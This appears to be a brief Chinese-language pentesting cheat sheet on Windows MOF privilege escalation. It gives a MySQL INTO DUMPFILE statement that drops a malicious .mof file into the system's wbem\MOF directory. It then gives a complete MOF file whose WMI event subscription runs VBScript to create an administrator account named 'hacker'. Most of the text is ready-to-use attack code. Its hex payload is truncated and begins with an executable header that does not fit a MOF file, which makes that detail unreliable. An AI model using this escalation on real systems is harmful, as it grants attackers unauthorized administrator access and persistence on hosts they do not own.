# MOF提权
核心原理​
Windows 的 ​WMI（Windows Management Instrumentation）​​ 每隔 5 分钟自动执行 %SystemRoot%\System32\wbem\MOF\ 中的 .mof 文件。
攻击者上传恶意 MOF 文件 → 系统定时执行文件中的 VBScript/JScript → 添加管理员用户或反弹 shell

--- 

​上传恶意 MOF 文件
```
SELECT unhex('4D5A...') INTO DUMPFILE 'C:\\Windows\\System32\\wbem\\MOF\\evil.mof';
-- 需要 MySQL 具有系统目录写入权限
```

MOF文件:
```
#pragma namespace("\\\\.\\root\\subscription")
instance of __EventFilter as $EventFilter {
    EventNamespace = "Root\\Cimv2";
    Name  = "HackFilter";
    Query = "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime'";
    QueryLanguage = "WQL";
};
instance of ActiveScriptEventConsumer as $Consumer {
    Name = "HackConsumer";
    ScriptingEngine = "VBScript";
    ScriptText = "Set obj = CreateObject(\"WScript.Shell\")\nobj.Run \"net user hacker P@ss123 /add\"\nobj.Run \"net localgroup administrators hacker /add\"";
};
instance of __FilterToConsumerBinding {
    Consumer = $Consumer;
    Filter = $EventFilter;
};
```